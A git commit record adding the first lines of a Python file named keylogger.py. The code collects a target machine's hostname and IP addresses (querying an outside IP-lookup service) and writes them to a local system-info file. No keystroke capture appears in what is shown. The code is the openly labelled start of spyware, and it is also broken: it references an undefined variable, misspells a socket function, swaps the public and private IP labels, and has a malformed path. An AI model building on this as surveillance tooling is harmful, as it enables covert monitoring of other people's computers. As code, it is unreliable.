24b39fd4ec792fef89f06ac3ce57d6e0dac56064
saffronic <ashna0733@gmail.com>
2025-03-30 11:38:51 +0530

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,17 @@
+import socket
+from requests import get
+
+log = 'keylog.txt'
+sys = 'sysinfo.txt'
+path = "C:\Users\HP\Desktop\ACM"
+add = '\\'
+
+def sysinfo():
+    with open(file + add + sys, "a") as file:
+        name = socket.gethostname()
+        #        
+        pub_ip = socket.gethosybyname(name)
+        priv_ip = get("https://api.ipify.org").text
+        file.write("pub ip: " + pub_ip + "\n")
+        file.write("targets name: " + name + "\n")
+        file.write("priv ip: " + priv_ip + '\n')
